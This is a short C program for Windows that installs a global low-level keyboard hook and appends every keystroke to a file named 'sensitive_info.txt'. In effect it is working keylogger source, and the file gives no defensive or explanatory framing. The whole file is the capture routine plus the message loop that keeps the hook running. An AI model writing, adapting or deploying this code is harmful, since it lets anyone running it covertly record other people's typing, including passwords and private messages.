// Create a keyboard hook with SetWindowsHookExA
#include <Windows.h>
#include <stdio.h>

HHOOK hHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        WCHAR key[2];
        WORD scanCode = p->scanCode;
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        ToUnicode(p->vkCode, scanCode, keyboardState, key, 2, 0);
        HANDLE hFile;
        DWORD dwBytesWritten;

        hFile = CreateFileA("sensitive_info.txt", GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            return 1;
        }
        SetFilePointer(hFile, 0, NULL, FILE_END);
        WriteFile(hFile, &key, sizeof(key), &dwBytesWritten, NULL);
        CloseHandle(hFile);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}


int main() {

    // printf("Starting hook...");
    hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (hHook == NULL) {
        return 1;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
